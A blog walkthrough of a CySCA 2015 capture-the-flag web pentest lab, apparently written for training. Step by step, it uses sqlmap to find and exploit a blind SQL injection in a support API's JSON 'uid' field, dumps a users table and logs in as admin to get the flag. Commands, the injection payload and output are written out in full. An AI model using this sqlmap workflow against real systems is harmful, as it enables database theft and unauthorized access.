---
title: CySCA 2015 - Web Application Pentest 5 - Turn it On & Off Again
author: nickw
layout: post

categories:
  - Blog
  - Security
---

<div style="font-size:0.7em"><i>Note: If you're interested in actually doing these challenges, <a href="/post/2015/cysca-web-pentest/">check out this post</a> on 
how to get the environment set up.</i>
</div>

* * *

As an executive, we notice we've got some additional functionality. We notice 
another menu item "IT Support" and the "Executive Board" option on the home
page. 

Since the challenge is called "Turn it on and off", we will have a poke around 
the IT support section.

The IT Section appears to be an area which allows users to submit IT Tickets. We
notice that it makes API requests to another server, namely `support.ecwi.cysca`.

Loading the list of tickets, we notice a POST request to 
`http://support.ecwi.cysca/ticket/get`, with the payload: 
`{uid: "5", secret: "4Da20BBfG19362c1b4ad6dea4A3aE9G3"}`.  The returned 
data is just a JSON list of tickets. 

Since we haven't had an SQL challenge yet, we pull out SQLMap and try to 
see what we can find. 

We copy the request from burp and save it into a file called tickets.txt:

{% highlight text %}
POST /ticket/get HTTP/1.1
Host: support.ecwi.cysca
Proxy-Connection: keep-alive
Content-Length: 55
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://10.0.0.2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36
Content-Type: application/json; charset=UTF-8
Referer: http://10.0.0.2/service/tickets
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8

{"uid":"5","secret":"4Da20BBfG19362c1b4ad6dea4A3aE9G3"}
{% endhighlight %}


Lets run sqlmap using that request. `sqlmap -r tickets.txt`. When burp asks 
"JSON data found in POST data. Do you want to process it? [Y/n/q]", we answer 
with "y"

{% highlight text %}
[18:12:04] [WARNING] (custom) POST parameter 'JSON uid' does not appear dynamic
[18:12:04] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401)
[18:12:04] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 2 times
{% endhighlight %}


Hmm, 401 errors. That's okay. We do some googling, and find that sqlmap actually
has an option to ignore 401 errors (provided you're running the latest version 
- 1.0-dev-69bc875). We run again, this time using 
`sqlmap -r tickets.txt --ignore-401`

{% highlight text %}
[18:12:39] [WARNING] (custom) POST parameter 'JSON secret' is not injectable
{% endhighlight %}

Still no dice. Let's increase the level: `sqlmap -r tickets.txt  --ignore-401 --level=3`.
That did the job:

{% highlight text %}
sqlmap identified the following injection point(s) with a total of 187 HTTP(s) requests:
---
Parameter: JSON uid ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"uid":"5" AND 6601=6601 AND "rgyW"="rgyW","secret":"4Da20BBfG19362c1b4ad6dea4A3aE9G3"}
---
{% endhighlight %}

Awesome. Let's get some data out of this database. We use multiple threads to 
speed up the collection, since this is a blind injection. Additionall, it looks 
**totally badass**.
`sqlmap.py -r tickets.txt  --ignore-401 --level=3 --tables --threads=10`:

{% highlight text %}
[5 tables]
+----------------+
| ecwidb_replies |
| ecwidb_tickets |
| ecwidb_tokens  |
| ecwidb_users   |
| ticket_replies |
+----------------+
{% endhighlight %}

Users looks like a place we should look. Lets take a look in there: 
`sqlmap.py -r tickets.txt  --ignore-401 --level=3 --dump -T ecwidb_users --threads=10`

{% highlight text %}
Table: ecwidb_users
[1 entry]
+---------+-----------+-----------+
| tid     | tusername | tpassword |
+---------+-----------+-----------+
| <blank> | <blank>   | <blank>   |
+---------+-----------+-----------+
{% endhighlight %}

Weird. We google the issue with returning blank results, and find 
[issue 861](https://github.com/sqlmapproject/sqlmap/issues/861). We re-run using
the suggestion of `--time-sec=20`. `sqlmap.py -r tickets.txt  --ignore-401 --level=3 --dump -T ecwidb_users --threads=2 --time-sec=20`.

{% highlight text %}
Table: ecwidb_users
[1 entry]
+----+----------+--------------------+
| id | username | password           |
+----+----------+--------------------+
| 1  | admin    | #d0ntev3nTryn00bz! |
+----+----------+--------------------+
{% endhighlight %}

We've now got the password to the IT support system, however, we don't know 
where to put it. We're going to need to hunt for a login page.

Navigating to `http://support.ecwi.cysca/` gies us a 404 page, so does 
`http://support.ecwi.cysca/login`. Maybe if we try 
`http://support.ecwi.cysca/admin/`. Interesting. We get a Flask/WSGI looking
"Unauthorized" message. Since we know this is some sort of working endpoint, 
we browse to `http://support.ecwi.cysca/admin/login`. Out pops a login page.

We log in, revealing the flag:

> FLAG{4a000000000000000000000000000000}

